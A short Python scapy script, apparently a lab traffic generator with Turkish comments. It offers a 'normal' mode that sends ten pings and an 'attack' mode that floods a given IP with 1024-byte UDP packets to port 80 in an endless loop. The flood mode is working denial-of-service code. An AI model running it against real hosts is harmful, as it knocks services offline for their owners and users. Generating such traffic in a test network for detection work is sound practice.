import sys
from scapy.all import *

def start_traffic(target_ip, mode):
    if mode == "attack":
        print(f"--- SALDIRI BASLATILDI: {target_ip} ---")
        # Saniyede yüzlerce UDP paketi gönderir
        send(IP(dst=target_ip)/UDP(dport=80)/Raw(load="X"*1024), loop=1, inter=0.002)
    
    elif mode == "normal":
        print(f"--- NORMAL TRAFIK: {target_ip} ---")
        # 10 adet ICMP (Ping) paketi gönderir
        send(IP(dst=target_ip)/ICMP(), count=10, inter=1)

if __name__ == "__main__":
    # Kullanım: python3 traffic_gen.py 10.0.0.2 attack
    if len(sys.argv) < 3:
        print("Kullanım: python3 traffic_gen.py <hedef_ip> <mode: attack/normal>")
    else:
        target = sys.argv[1]
        action = sys.argv[2]
        start_traffic(target, action)